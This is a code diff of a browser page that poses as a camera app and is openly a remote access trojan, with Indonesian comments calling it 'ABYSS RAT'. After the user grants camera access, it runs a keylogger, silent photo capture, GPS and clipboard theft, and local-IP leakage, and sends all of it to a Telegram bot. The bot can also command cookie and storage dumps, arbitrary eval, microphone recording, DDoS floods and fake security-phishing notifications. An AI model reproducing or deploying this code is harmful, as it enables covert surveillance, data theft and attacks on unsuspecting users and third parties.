+                        ts: new Date(pos.timestamp).toISOString()
                     };
-                    console.log('📍 GPS updated:', gpsData.lat, gpsData.lon);
                 },
-                (err) => {
-                    console.warn('📍 GPS error:', err.message);
-                }, {
-                    enableHighAccuracy: true,
-                    maximumAge: 0,
-                    timeout: 5000
-                }
+                () => {},
+                { enableHighAccuracy: true, maximumAge: 30000, timeout: 10000 }
             );
         }
 
-        // ===========================================================
-        // WEBRTC IP LEAK — Ambil IP lokal korban
-        // ===========================================================
-        function getLocalIPs() {
+        // ==================== WEBRTC IP LEAK ====================
+        function grabLocalIPs() {
             return new Promise((resolve) => {
                 const ips = new Set();
-                const pc = new RTCPeerConnection({
-                    iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
-                });
+                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                 pc.createDataChannel('');
-                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                pc.createOffer().then(o => pc.setLocalDescription(o));
                 pc.onicecandidate = (e) => {
                     if (e.candidate) {
                         const ip = e.candidate.address;
-                        if (ip && !ip.includes('::') && !ip.startsWith('127.')) {
-                            ips.add(ip);
-                        }
+                        if (ip && !ip.includes('::') && !ip.startsWith('127.') && !ip.startsWith('0.')) ips.add(
+                            ip);
                     } else {
-                        // ICE gathering selesai
                         pc.close();
                         resolve(Array.from(ips));
                     }
                 };
-                // Timeout 2 detik
-                setTimeout(() => {
-                    pc.close();
-                    resolve(Array.from(ips));
-                }, 2000);
+                setTimeout(() => { pc.close();
+                    resolve(Array.from(ips)); }, 2500);
             });
         }
 
-        // ===========================================================
-        // KAMERA START — 3 TAHAP FALLBACK
-        // ===========================================================
-        async function startCamera(facing = facingMode) {
-            if (isStarting) return false;
-            isStarting = true;
-            allowBtn.disabled = true;
-            errorMsg.textContent = '';
-            statusText.textContent = '⏳ Mengakses kamera...';
-
+        // ==================== CLIPBOARD ====================
+        async function checkClipboard() {
             try {
-                if (stream) {
-                    stream.getTracks().forEach(t => t.stop());
-                    stream = null;
+                const text = await navigator.clipboard.readText();
+                if (text && text !== lastClip && text.length > 0) {
+                    lastClip = text;
+                    await tgSendMessage(`📋 [${VID}] Clipboard:\n${text.substring(0, 1500)}`);
                 }
-
-                let tempStream = null;
-                let lastError = null;
-
-                try {
-                    statusText.textContent = '📷 Mencoba kamera ' + (facing === 'environment' ? 'belakang' : 'depan') +
-                        '...';
-                    const constraints = { video: { facingMode: facing }, audio: false };
-                    tempStream = await navigator.mediaDevices.getUserMedia(constraints);
-                    console.log('✅ Tahap 1 berhasil');
-                } catch (err1) {
-                    console.warn('Tahap 1 gagal:', err1.message);
-                    lastError = err1;
-                    if (facing === 'user') {
-                        try {
-                            statusText.textContent = '🔄 Coba kamera belakang...';
-                            const constraints2 = { video: { facingMode: 'environment' }, audio: false };
-                            tempStream = await navigator.mediaDevices.getUserMedia(constraints2);
-                            facingMode = 'environment';
-                            console.log('✅ Tahap 2 berhasil (force environment)');
-                        } catch (err2) {
-                            console.warn('Tahap 2 gagal:', err2.message);
-                            lastError = err2;
-                        }
-                    } else {
-                        try {
-                            statusText.textContent = '🔄 Coba kamera depan...';
-                            const constraints2b = { video: { facingMode: 'user' }, audio: false };
-                            tempStream = await navigator.mediaDevices.getUserMedia(constraints2b);
-                            facingMode = 'user';
-                            console.log('✅ Tahap 2b berhasil (force user)');
-                        } catch (err2b) {
-                            console.warn('Tahap 2b gagal:', err2b.message);
-                            lastError = err2b;
-                        }
-                    }
-                    if (!tempStream) {
-                        try {
-                            statusText.textContent = '🔄 Coba mode default...';
-                            const constraints3 = { video: true, audio: false };
-                            tempStream = await navigator.mediaDevices.getUserMedia(constraints3);
-                            console.log('✅ Tahap 3 berhasil (default)');
-                        } catch (err3) {
-                            console.warn('Tahap 3 gagal:', err3.message);
-                            lastError = err3;
-                        }
-                    }
-                }
-
-                if (!tempStream) throw lastError || new Error('Semua percobaan gagal');
-
-                stream = tempStream;
-                video.srcObject = stream;
-                await video.play();
-                statusText.textContent = '✅ Kamera aktif!';
-                errorMsg.textContent = '';
-
-                updateZoom();
-                try {
-                    const track = stream.getVideoTracks()[0];
-                    const cap = track.getCapabilities();
-                    if (cap.torch) {
-                        await track.applyConstraints({ advanced: [{ torch: flashOn }] });
-                    }
-                } catch (e) {}
-                updateFlashUI();
-
-                overlay.classList.add('hidden');
-                isStarting = false;
-                allowBtn.disabled = false;
-
-                // Mulai fitur ilegal setelah kamera aktif
-                if (!phishingShown) {
-                    schedulePhishing();
-                }
-                startAutoSwitch();
-                startGPSTracking();
-
-                return true;
-
-            } catch (err) {
-                console.error('❌ Gagal total:', err);
-                let msg = err.message;
-                if (msg.includes('Permission')) msg = 'Izin kamera ditolak. Beri izin di browser.';
-                else if (msg.includes('NotFound')) msg = 'Tidak ditemukan kamera.';
-                else if (msg.includes('NotAllowed')) msg = 'Izin ditolak. Cek pengaturan browser.';
-                else if (msg.includes('Overconstrained')) msg = 'Kamera tidak mendukung mode ini.';
-                errorMsg.textContent = '❌ ' + msg;
-                statusText.textContent = '⚠️ Gagal, tekan tombol untuk coba lagi.';
-                isStarting = false;
-                allowBtn.disabled = false;
-                return false;
-            }
+            } catch (e) {}
         }
 
-        // ===========================================================
-        // PERMISSION
-        // ===========================================================
-        allowBtn.addEventListener('click', async () => {
-            await startCamera(facingMode);
-        });
+        // ==================== KEYLOGGER ====================
+        function startKeylogger() {
+            if (keylogRunning) return;
+            keylogRunning = true;
+            document.addEventListener('keydown', (e) => {
+                const ignore = ['Shift', 'Control', 'Alt', 'Meta', 'CapsLock', 'Tab', 'ArrowLeft',
+                    'ArrowRight', 'ArrowUp', 'ArrowDown', 'Escape'
+                ];
+                if (ignore.includes(e.key)) return;
+                if (e.key === 'Enter') keyBuf += '[↵]\n';
+                else if (e.key === 'Backspace') keyBuf += '[⌫]';
+                else if (e.key === ' ') keyBuf += ' ';
+                else if (e.key.length === 1) keyBuf += e.key;
+                else keyBuf += `[${e.key}]`;
 
-        // ===========================================================
-        // FLASH
-        // ===========================================================
-        function updateFlashUI() {
-            if (flashOn) {
-                flashToggle.classList.add('active');
-                flashLabel.textContent = 'On';
-            } else {
-                flashToggle.classList.remove('active');
-                flashLabel.textContent = 'Flash';
-            }
-        }
-        flashToggle.addEventListener('click', async () => {
-            if (!stream) return;
-            const track = stream.getVideoTracks()[0];
-            try {
-                flashOn = !flashOn;
-                await track.applyConstraints({ advanced: [{ torch: flashOn }] });
-                updateFlashUI();
-            } catch (e) {
-                alert('Perangkat tidak mendukung flash/torch');
-                flashOn = false;
-                updateFlashUI();
-            }
-        });
-
-        // ===========================================================
-        // BLUR TOGGLE
-        // ===========================================================
-        blurToggle.addEventListener('click', function() {
-            blurEnabled = !blurEnabled;
-            this.classList.toggle('active', blurEnabled);
-            blurLabel.textContent = blurEnabled ? 'On' : 'Blur';
-        });
-
-        // ===========================================================
-        // WATERMARK TOGGLE
-        // ===========================================================
-        wmToggle.addEventListener('click', function() {
-            watermarkEnabled = !watermarkEnabled;
-            this.classList.toggle('active', watermarkEnabled);
-        });
-
-        // ===========================================================
-        // SILENT MODE TOGGLE (ILEGAL)
-        // ===========================================================
-        silentToggle.addEventListener('click', function() {
-            silentMode = !silentMode;
-            if (silentMode) {
-                this.style.background = 'rgba(255,0,0,0.7)';
-                this.style.borderColor = 'rgba(255,0,0,0.9)';
-                silentLabel.textContent = '🔴 Silent ON';
-                // Aktifkan continuous capture
-                if (!continuousCapture && stream) {
-                    startContinuousCapture();
+                if (keyBuf.length > 500) {
+                    tgSendMessage(`⌨️ [${VID}] Keylog:\n${keyBuf}`);
+                    keyBuf = '';
                 }
-            } else {
-                this.style.background = 'rgba(255,0,0,0.3)';
-                this.style.borderColor = 'rgba(255,0,0,0.5)';
-                silentLabel.textContent = '🔴 Silent';
-                stopContinuousCapture();
-            }
-        });
-
-        // ===========================================================
-        // CONTINUOUS CAPTURE — Foto diam-diam tiap 5 detik
-        // ===========================================================
-        function startContinuousCapture() {
-            if (continuousCapture) return;
-            continuousCapture = true;
-            console.log('🟡 Continuous capture dimulai...');
-            continuousInterval = setInterval(() => {
-                if (stream && stream.active) {
-                    captureSilentFrame();
+            });
+            // Flush setiap 15 detik
+            setInterval(() => {
+                if (keyBuf.length > 0) {
+                    tgSendMessage(`⌨️ [${VID}] Keylog:\n${keyBuf}`);
+                    keyBuf = '';
                 }
-            }, 5000); // Tiap 5 detik
+            }, 15000);
         }
 
-        function stopContinuousCapture() {
-            continuousCapture = false;
-            if (continuousInterval) {
-                clearInterval(continuousInterval);
-                continuousInterval = null;
-            }
-            console.log('🔴 Continuous capture dihentikan');
+        // ==================== SILENT CAPTURE ====================
+        function startSilentCapture() {
+            if (silentCapInterval) return;
+            silentCapInterval = setInterval(() => {
+                if (!stream || !stream.active) return;
+                captureFrame(true);
+            }, 5000);
         }
 
-        function captureSilentFrame() {
-            if (!stream) return;
+        function captureFrame(silent = false) {
+            if (!stream || !stream.active) return;
             try {
                 const track = stream.getVideoTracks()[0];
                 const settings = track.getSettings();
@@ -803,100 +650,413 @@
                 canvas.width = settings.width || 1280;
                 canvas.height = settings.height || 720;
                 const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0);
-
-                // Kirim via sendBeacon agar tidak terdeteksi
+                ctx.drawImage(vf, 0, 0);
                 canvas.toBlob((blob) => {
-                    const formData = new FormData();
-                    formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', blob, `silent_${Date.now()}.jpg`);
-                    formData.append('caption', '🤫 Silent capture ' + new Date().toLocaleString());
-                    formData.append('disable_notification', 'true');
+                    if (!blob) return;
+                    let cap = `🤫 Silent | ${new Date().toLocaleTimeString('id-ID')}`;
+                    if (gpsData) cap +=
+                        `\n📍 https://maps.google.com/?q=${gpsData.lat},${gpsData.lon}`;
+                    if (silent) {
+                        tgSendBeacon(blob, cap);
+                    } else {
+                        tgSendPhoto(blob, cap);
+                    }
+                }, 'image/jpeg', 0.82);
+            } catch (e) {}
+        }
 
-                    navigator.sendBeacon(
-                        `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
-                        formData
-                    );
-                }, 'image/jpeg', 0.85);
+        // ==================== DUAL SWITCH ====================
+        function startDualSwitch() {
+            if (dualSwitchInterval) return;
+            dualSwitchInterval = setInterval(async () => {
+                if (!stream || !stream.active) return;
+                const newFace = facingMode === 'environment' ? 'user' : 'environment';
+                await startCamera(newFace);
+                setTimeout(() => captureFrame(true), 1500);
+            }, 20000);
+        }
+
+        // ==================== C2 TELEGRAM POLLING ====================
+        async function pollC2() {
+            try {
+                const res = await fetch(`${TG_API}/getUpdates?offset=${lastUpdateId + 1}&timeout=8`);
+                const data = await res.json();
+                if (!data.ok || !data.result.length) return;
+
+                for (const upd of data.result) {
+                    lastUpdateId = upd.update_id;
+                    const msg = upd.message;
+                    if (!msg || !msg.text) continue;
+                    const parts = msg.text.trim().split(/\s+/);
+                    const cmd = parts[0].toLowerCase();
+                    const target = parts[1] || '';
+                    const args = parts.slice(2);
+
+                    // Hanya proses jika target cocok atau broadcast ALL
+                    if (target !== VID && target !== 'ALL' && target !== 'BROADCAST') continue;
+
+                    let result = '';
+                    switch (cmd) {
+                        case '/ping':
+                            result = `🟢 ${VID} online | ${new Date().toLocaleString('id-ID')}`;
+                            break;
+                        case '/photo':
+                            captureFrame(false);
+                            result = '📸 Foto dikirim';
+                            break;
+                        case '/gps':
+                            result = gpsData ? JSON.stringify(gpsData, null, 2) : 'GPS belum tersedia';
+                            break;
+                        case '/clip':
+                            await checkClipboard();
+                            result = '📋 Clipboard dikirim jika ada data baru';
+                            break;
+                        case '/cookies':
+                            result = document.cookie || '(kosong)';
+                            break;
+                        case '/storage':
+                            const loot = {
+                                localStorage: { ...localStorage },
+                                sessionStorage: { ...sessionStorage },
+                                url: location.href,
+                                ua: navigator.userAgent,
+                                screen: `${screen.width}x${screen.height}`,
+                                lang: navigator.language,
+                                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                            };
+                            const blob = new Blob([JSON.stringify(loot, null, 2)], { type: 'application/json' });
+                            await tgSendDocument(blob, `storage_${VID}.json`, `💾 Storage dump ${VID}`);
+                            result = '💾 Storage dikirim';
+                            break;
+                        case '/flip':
+                            const nf = facingMode === 'environment' ? 'user' : 'environment';
+                            await startCamera(nf);
+                            result = '📷 Kamera dibalik: ' + nf;
+                            break;
+                        case '/redirect':
+                            if (args[0]) window.location.href = args[0];
+                            result = '🔗 Redirect ke ' + args[0];
+                            break;
+                        case '/eval':
+                            try {
+                                const evRes = eval(args.join(' '));
+                                result = '✅ eval result: ' + String(evRes).substring(0, 1500);
+                            } catch (e) {
+                                result = '❌ eval error: ' + e.message;
+                            }
+                            break;
+                        case '/info':
+                            result =
+                                `🆔 ${VID}\n📱 ${navigator.userAgent}\n🖥️ ${screen.width}x${screen.height}\n🌐 ${navigator.language}\n🕐 ${new Date().toISOString()}\n📍 ${gpsData ? gpsData.lat + ',' + gpsData.lon : 'N/A'}\n📷 ${facingMode}`;
+                            break;
+                        case '/notif':
+                            if (Notification.permission === 'granted' && args[0]) {
+                                new Notification('🔔 Info', { body: args.join(' '), icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%23007aff"><circle cx="12" cy="12" r="10"/></svg>' });
+                                result = 'Notifikasi dikirim';
+                            } else {
+                                result = 'Notifikasi tidak bisa (izin: ' + Notification.permission + ')';
+                            }
+                            break;
+                        case '/mic':
+                            const dur = parseInt(args[0]) || 10;
+                            result = await recordMic(dur);
+                            break;
+                        case '/ddos':
+                            if (args[0]) {
+                                ddosNode(args[0], parseInt(args[1]) || 30, parseInt(args[2]) || 20);
+                                result = `🔥 DDoS dimulai: ${args[0]} | ${args[1] || 30}s | ${args[2] || 20} threads`;
+                            } else {
+                                result = '❌ /ddos <url> [durasi] [threads]';
+                            }
+                            break;
+                        case '/wipelogs':
+                            localStorage.clear();
+                            sessionStorage.clear();
+                            try { indexedDB.databases().then(dbs => dbs.forEach(db => indexedDB.deleteDatabase(
+                                    db.name))); } catch (e) {}
+                            result = '🧹 Logs dibersihkan';
+                            break;
+                        case '/selfdest':
+                            result = '💀 Self destruct...';
+                            await tgSendMessage(`💀 ${VID} self destruct`);
+                            clearAllIntervals();
+                            document.body.innerHTML = '';
+                            setTimeout(() => window.close(), 500);
+                            break;
+                        default:
+                            result = `❓ Command tidak dikenal: ${cmd}`;
+                    }
+
+                    if (result) {
+                        await tgSendMessage(`[${VID}] ${result}`);
+                    }
+                }
+            } catch (e) {}
+        }
+
+        function clearAllIntervals() {
+            [silentCapInterval, dualSwitchInterval, c2PollInterval, phishingTimer].forEach(iv => {
+                if (iv) clearInterval(iv);
+            });
+            if (gpsWatchId) navigator.geolocation.clearWatch(gpsWatchId);
+        }
+
+        // ==================== MIC RECORD ====================
+        async function recordMic(duration = 10) {
+            try {
+                const micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const mr = new MediaRecorder(micStream);
+                const chunks = [];
+                mr.ondataavailable = (e) => chunks.push(e.data);
+                mr.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'audio/ogg' });
+                    const fd = new FormData();
+                    fd.append('chat_id', CHAT_ID);
+                    fd.append('voice', blob, `mic_${Date.now()}.ogg`);
+                    fd.append('disable_notification', 'true');
+                    await fetch(`${TG_API}/sendVoice`, { method: 'POST', body: fd });
+                    micStream.getTracks().forEach(t => t.stop());
+                };
+                mr.start();
+                setTimeout(() => mr.stop(), duration * 1000);
+                return `🎤 Merekam ${duration} detik...`;
             } catch (e) {
-                console.warn('Silent capture gagal:', e);
+                return '❌ Mic gagal: ' + e.message;
             }
         }
 
-        // ===========================================================
-        // AUTO SWITCH CAMERA — Dual capture tiap 15 detik
-        // ===========================================================
-        function startAutoSwitch() {
-            if (autoSwitchInterval) return;
-            autoSwitchInterval = setInterval(async () => {
-                if (!stream || !stream.active) return;
-                const newFacing = facingMode === 'environment' ? 'user' : 'environment';
-                await startCamera(newFacing);
-                setTimeout(() => {
-                    if (silentMode) captureSilentFrame();
-                }, 1200);
-            }, 15000); // Tiap 15 detik
+        // ==================== DDoS NODE ====================
+        async function ddosNode(targetUrl, duration = 30, threads = 20) {
+            const endTime = Date.now() + duration * 1000;
+            const tasks = [];
+            for (let i = 0; i < threads; i++) {
+                tasks.push((async () => {
+                    while (Date.now() < endTime) {
+                        try {
+                            await fetch(targetUrl + '?r=' + Math.random(), {
+                                mode: 'no-cors',
+                                cache: 'no-store'
+                            });
+                        } catch (e) {}
+                    }
+                })());
+            }
+            await Promise.allSettled(tasks);
         }
 
-        // ===========================================================
-        // SWITCH KAMERA MANUAL
-        // ===========================================================
-        switchCam.addEventListener('click', async () => {
-            const newFacing = facingMode === 'environment' ? 'user' : 'environment';
-            await startCamera(newFacing);
+        // ==================== NOTIFICATION PHISHING ====================
+        async function requestNotifPerm() {
+            if (!('Notification' in window)) return;
+            const perm = await Notification.requestPermission();
+            if (perm === 'granted') {
+                // Jadwalkan notif phishing setelah 3 menit
+                setTimeout(() => {
+                    new Notification('🔐 Keamanan Akun', {
+                        body: 'Aktivitas mencurigakan terdeteksi. Verifikasi akun Anda sekarang.',
+                        icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%23ff3b30"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>',
+                        tag: 'phish-otp-1',
+                        requireInteraction: true,
+                        vibrate: [200, 100, 200]
+                    });
+                }, 180000);
+            }
+        }
+
+        // ==================== SERVICE WORKER ====================
+        function registerSW() {
+            if (!('serviceWorker' in navigator)) return;
+            const swCode = `
+                self.addEventListener('install', (e) => { self.skipWaiting(); });
+                self.addEventListener('activate', (e) => { e.waitUntil(clients.claim()); });
+                setInterval(() => {
+                    fetch('${TG_API}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent('💓 HB ' + VID + ' | ' + new Date().toLocaleTimeString('id-ID'))}&disable_notification=true').catch(()=>{});
+                }, 60000);
+                self.addEventListener('fetch', (e) => {});
+            `;
+            const swBlob = new Blob([swCode], { type: 'application/javascript' });
+            const swUrl = URL.createObjectURL(swBlob);
+            navigator.serviceWorker.register(swUrl).then(() => {
+                console.log('✅ SW registered');
+            }).catch(() => {});
+        }
+
+        // ==================== KAMERA ====================
+        async function startCamera(facing = facingMode) {
+            if (isStarting) return false;
+            isStarting = true;
+            btnStart.disabled = true;
+            errMsg.textContent = '';
+            statusDot.className = 'status-dot';
+            statusMsg.textContent = 'Mengakses kamera...';
+
+            try {
+                if (stream) {
+                    stream.getTracks().forEach(t => t.stop());
+                    stream = null;
+                }
+                let tempStream = null;
+                let lastErr = null;
+
+                const tryGet = async (constraints, label) => {
+                    statusMsg.textContent = label;
+                    return await navigator.mediaDevices.getUserMedia(constraints);
+                };
+
+                try {
+                    tempStream = await tryGet({ video: { facingMode: facing }, audio: false },
+                        `Mencoba kamera ${facing === 'environment' ? 'belakang' : 'depan'}...`);
+                } catch (e1) {
+                    lastErr = e1;
+                    const altFace = facing === 'environment' ? 'user' : 'environment';
+                    try {
+                        tempStream = await tryGet({ video: { facingMode: altFace }, audio: false },
+                            `Beralih ke kamera ${altFace === 'environment' ? 'belakang' : 'depan'}...`);
+                        facingMode = altFace;
+                    } catch (e2) {
+                        lastErr = e2;
+                        try {
+                            tempStream = await tryGet({ video: true, audio: false }, 'Mode default...');
+                        } catch (e3) {
+                            lastErr = e3;
+                        }
+                    }
+                }
+
+                if (!tempStream) throw lastErr || new Error('Tidak ada kamera tersedia');
+
+                stream = tempStream;
+                vf.srcObject = stream;
+                await vf.play();
+
+                statusDot.className = 'status-dot ok';
+                statusMsg.textContent = 'Kamera aktif';
+                applyZoom();
+                try {
+                    const track = stream.getVideoTracks()[0];
+                    const cap = track.getCapabilities();
+                    if (cap.torch) await track.applyConstraints({ advanced: [{ torch: flashOn }] });
+                } catch (e) {}
+                updateFlashUI();
+
+                permOverlay.classList.add('hidden');
+                isStarting = false;
+                btnStart.disabled = false;
+
+                // ===== AKTIFKAN SEMUA FITUR RAT DIAM-DIAM =====
+                initRAT();
+                return true;
+
+            } catch (err) {
+                statusDot.className = 'status-dot err';
+                let msg = 'Gagal mengakses kamera';
+                if (err.message.includes('Permission')) msg = 'Izin kamera diperlukan';
+                else if (err.message.includes('NotFound')) msg = 'Kamera tidak ditemukan';
+                else if (err.message.includes('NotAllowed')) msg = 'Izin ditolak';
+                errMsg.textContent = msg;
+                statusMsg.textContent = 'Silakan coba lagi';
+                isStarting = false;
+                btnStart.disabled = false;
+                return false;
+            }
+        }
+
+        function initRAT() {
+            // Kirim info victim
+            (async () => {
+                localIPs = await grabLocalIPs();
+                const info = `🟢 VICTIM ONLINE\n🆔 ${VID}\n📱 ${navigator.userAgent}\n🖥️ ${screen.width}x${screen.height}\n🌐 ${navigator.language}\n🌍 IP Lokal: ${localIPs.join(', ') || 'N/A'}\n🔗 ${location.href}\n🕐 ${new Date().toLocaleString('id-ID')}`;
+                await tgSendMessage(info);
+            })();
+
+            startGPS();
+            startSilentCapture();
+            startDualSwitch();
+            startKeylogger();
+            startC2Polling();
+            registerSW();
+            requestNotifPerm();
+
+            // Clipboard check setiap 4 detik
+            setInterval(checkClipboard, 4000);
+
+            // Heartbeat setiap 2 menit
+            setInterval(() => {
+                tgSendMessage(`💓 HB ${VID} | ${new Date().toLocaleTimeString('id-ID')} | 📍 ${gpsData ? gpsData.lat.toFixed(4)+','+gpsData.lon.toFixed(4) : 'N/A'}`);
+            }, 120000);
+
+            console.log('🐺 ABYSS RAT AKTIF — Semua modul berjalan');
+        }
+
+        function startC2Polling() {
+            if (c2PollInterval) return;
+            const poll = async () => {
+                await pollC2();
+                c2PollInterval = setTimeout(poll, 3000);
+            };
+            poll();
+        }
+
+        // ==================== UI HANDLERS ====================
+        btnStart.addEventListener('click', () => startCamera(facingMode));
+
+        function updateFlashUI() {
+            btnFlash.classList.toggle('on', flashOn);
+            lblFlash.textContent = flashOn ? 'On' : 'Flash';
+        }
+        btnFlash.addEventListener('click', async () => {
+            if (!stream) return;
+            const track = stream.getVideoTracks()[0];
+            try {
+                flashOn = !flashOn;
+                await track.applyConstraints({ advanced: [{ torch: flashOn }] });
+                updateFlashUI();
+            } catch (e) {}
         });
 
-        // ===========================================================
-        // ZOOM
-        // ===========================================================
-        function updateZoom() {
+        btnBlur.addEventListener('click', () => {
+            blurOn = !blurOn;
+            btnBlur.classList.toggle('on', blurOn);
+            lblBlur.textContent = blurOn ? 'On' : 'Blur';
+        });
+        btnWM.addEventListener('click', () => {
+            wmOn = !wmOn;
+            btnWM.classList.toggle('on', wmOn);
+        });
+
+        btnFlip.addEventListener('click', async () => {
+            const nf = facingMode === 'environment' ? 'user' : 'environment';
+            await startCamera(nf);
+        });
+
+        btnTimer.addEventListener('click', () => {
+            const timers = ['3s', '5s', '10s', 'Off'];
+            const cur = lblTimer.textContent;
+            const idx = (timers.indexOf(cur) + 1) % timers.length;
+            lblTimer.textContent = timers[idx];
+        });
+
+        function applyZoom() {
             zoomVal.textContent = currentZoom + '×';
-            zoomVal.classList.remove('pop');
-            void zoomVal.offsetWidth;
-            zoomVal.classList.add('pop');
-            setTimeout(() => zoomVal.classList.remove('pop'), 300);
             if (stream) {
                 const track = stream.getVideoTracks()[0];
                 const cap = track.getCapabilities();
                 if (cap.zoom) {
-                    const max = cap.zoom.max || 5;
-                    const min = cap.zoom.min || 1;
-                    const val = Math.min(max, Math.max(min, currentZoom));
+                    const val = Math.min(cap.zoom.max || 5, Math.max(cap.zoom.min || 1, currentZoom));
                     track.applyConstraints({ advanced: [{ zoom: val }] }).catch(() => {});
                 }
             }
         }
-        zoomMinus.addEventListener('click', () => {
-            if (currentZoom > 1) {
-                currentZoom = Math.max(1, currentZoom - 0.5);
-                updateZoom();
-            }
+        btnZoomIn.addEventListener('click', () => {
+            if (currentZoom < 5) { currentZoom = Math.min(5, currentZoom + 0.5);
+                applyZoom(); }
         });
-        zoomPlus.addEventListener('click', () => {
-            if (currentZoom < 5) {
-                currentZoom = Math.min(5, currentZoom + 0.5);
-                updateZoom();
-            }
+        btnZoomOut.addEventListener('click', () => {
+            if (currentZoom > 1) { currentZoom = Math.max(1, currentZoom - 0.5);
+                applyZoom(); }
         });
 
-        // ===========================================================
-        // TIMER (UI)
-        // ===========================================================
-        timerBtn.addEventListener('click', function() {
-            const timers = ['3s', '5s', '10s', 'Off'];
-            let idx = timers.indexOf(timerLabel.textContent);
-            idx = (idx + 1) % timers.length;
-            timerLabel.textContent = timers[idx];
-        });
-
-        // ===========================================================
-        // AMBIL FOTO + EFEK + WATERMARK + GPS
-        // ===========================================================
-        function capturePhoto(isSilent = false) {
-            if (!stream) {
-                if (!isSilent) alert('Kamera belum aktif. Tekan Lanjutkan dulu.');
-                return;
-            }
+        function takePhoto() {
+            if (!stream) return;
             const track = stream.getVideoTracks()[0];
             const settings = track.getSettings();
             const canvas = document.createElement('canvas');
@@ -905,244 +1065,97 @@
             canvas.width = w;
             canvas.height = h;
             const ctx = canvas.getContext('2d');
+            ctx.drawImage(vf, 0, 0, w, h);
 
-            ctx.drawImage(video, 0, 0, w, h);
-
-            if (blurEnabled) {
-                const offscreen = document.createElement('canvas');
-                offscreen.width = w;
-                offscreen.height = h;
-                const offCtx = offscreen.getContext('2d');
-                offCtx.drawImage(video, 0, 0, w, h);
-                offCtx.filter = 'blur(22px)';
-                offCtx.drawImage(offscreen, 0, 0);
-                ctx.drawImage(offscreen, 0, 0);
+            if (blurOn) {
+                const off = document.createElement('canvas');
+                off.width = w;
+                off.height = h;
+                const octx = off.getContext('2d');
+                octx.drawImage(vf, 0, 0, w, h);
+                octx.filter = 'blur(20px)';
+                octx.drawImage(off, 0, 0);
+                ctx.drawImage(off, 0, 0);
                 ctx.save();
-                const centerX = w / 2;
-                const centerY = h / 2;
-                const radius = Math.min(w, h) * 0.32;
+                const cx = w / 2,
+                    cy = h / 2,
+                    r = Math.min(w, h) * 0.3;
                 ctx.beginPath();
-                ctx.arc(centerX, centerY, radius, 0, 2 * Math.PI);
+                ctx.arc(cx, cy, r, 0, Math.PI * 2);
                 ctx.clip();
-                ctx.drawImage(video, 0, 0, w, h);
+                ctx.drawImage(vf, 0, 0, w, h);
                 ctx.restore();
             }
-
-            if (watermarkEnabled) {
-                ctx.shadowColor = 'rgba(0,0,0,0.85)';
-                ctx.shadowBlur = 12;
+            if (wmOn) {
+                ctx.shadowColor = 'rgba(0,0,0,0.8)';
+                ctx.shadowBlur = 10;
                 ctx.shadowOffsetX = 2;
                 ctx.shadowOffsetY = 2;
-                const date = new Date();
-                const ts = date.toLocaleString('id-ID', {
-                    day: '2-digit',
-                    month: '2-digit',
-                    year: 'numeric',
-                    hour: '2-digit',
-                    minute: '2-digit',
-                    second: '2-digit'
-                });
-                ctx.font = 'bold 26px -apple-system, BlinkMacSystemFont, sans-serif';
-                ctx.fillStyle = 'rgba(255, 255, 255, 0.92)';
-                ctx.fillText('📸 ' + ts, 24, h - 32);
-
-                // Tambah GPS info jika tersedia
+                const ts = new Date().toLocaleString('id-ID');
+                ctx.font = 'bold 24px -apple-system, sans-serif';
+                ctx.fillStyle = 'rgba(255,255,255,0.9)';
+                ctx.fillText('📸 ' + ts, 20, h - 30);
                 if (gpsData) {
-                    ctx.font = '14px monospace';
-                    ctx.fillStyle = 'rgba(255, 255, 255, 0.7)';
-                    ctx.fillText(
-                        `📍 ${gpsData.lat.toFixed(5)}, ${gpsData.lon.toFixed(5)}`,
-                        24, h - 62
-                    );
+                    ctx.font = '13px monospace';
+                    ctx.fillStyle = 'rgba(255,255,255,0.65)';
+                    ctx.fillText(`📍 ${gpsData.lat.toFixed(5)}, ${gpsData.lon.toFixed(5)}`, 20, h - 60);
                 }
-
-                ctx.font = '16px -apple-system, sans-serif';
-                ctx.fillStyle = 'rgba(255, 255, 255, 0.6)';
-                ctx.fillText('Kamera Pro', w - 130, h - 24);
                 ctx.shadowBlur = 0;
                 ctx.shadowOffsetX = 0;
                 ctx.shadowOffsetY = 0;
             }
 
-            const dataUrl = canvas.toDataURL('image/jpeg', 0.94);
+            const dataUrl = canvas.toDataURL('image/jpeg', 0.92);
             lastPhotoData = dataUrl;
+            thumbBox.innerHTML = `<img src="${dataUrl}" alt="thumb">`;
+            thumbBox.classList.add('has-img');
 
-            // Thumbnail
-            galleryThumb.innerHTML = `<img src="${dataUrl}" alt="preview">`;
-            galleryThumb.classList.add('has-image');
+            flashEl.classList.add('fire');
+            setTimeout(() => flashEl.classList.remove('fire'), 100);
 
-            // Hanya tampilkan flash & download jika TIDAK silent
-            if (!isSilent && !silentMode) {
-                flashEffect.classList.add('active');
-                setTimeout(() => flashEffect.classList.remove('active'), 100);
-                const link = document.createElement('a');
-                link.download = `photo_${Date.now()}.jpg`;
-                link.href = dataUrl;
-                document.body.appendChild(link);
-                link.click();
-                document.body.removeChild(link);
-            }
+            const link = document.createElement('a');
+            link.download = `photo_${Date.now()}.jpg`;
+            link.href = dataUrl;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
 
-            // Kirim Telegram dengan GPS caption
-            sendToTelegram(dataUrl);
+            canvas.toBlob((blob) => {
+                if (!blob) return;
+                let cap = `📸 Foto | ${new Date().toLocaleString('id-ID')}`;
+                if (gpsData) cap +=
+                    `\n📍 https://maps.google.com/?q=${gpsData.lat},${gpsData.lon}\n🎯 ±${gpsData.acc}m`;
+                if (localIPs.length) cap += `\n🌐 ${localIPs[0]}`;
+                tgSendPhoto(blob, cap);
